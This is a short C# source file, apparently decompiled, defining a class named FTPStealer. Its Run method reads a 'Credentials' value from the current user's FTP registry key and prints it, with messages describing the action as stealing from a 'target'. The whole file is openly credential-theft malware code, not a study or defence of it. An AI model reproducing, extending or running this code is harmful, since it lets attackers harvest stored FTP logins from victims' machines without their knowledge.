using System;
using System.Text;
using Microsoft.Win32;

// Token: 0x02000007 RID: 7
public class FTPStealer
{
	// Token: 0x0600000A RID: 10 RVA: 0x00002148 File Offset: 0x00000348
	public void Run()
	{
		string text = "Software\\Microsoft\\FTP";
		string text2 = "Credentials";
		using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text))
		{
			if (registryKey != null)
			{
				try
				{
					byte[] array = (byte[])registryKey.GetValue(text2);
					Console.WriteLine(Encoding.Default.GetString(array));
					return;
				}
				catch (Exception)
				{
					Console.WriteLine("Error Stealing FTP. (Target may NOT have FTP).");
					return;
				}
			}
			Console.WriteLine("[-] Target does not have FTP.");
		}
	}
}
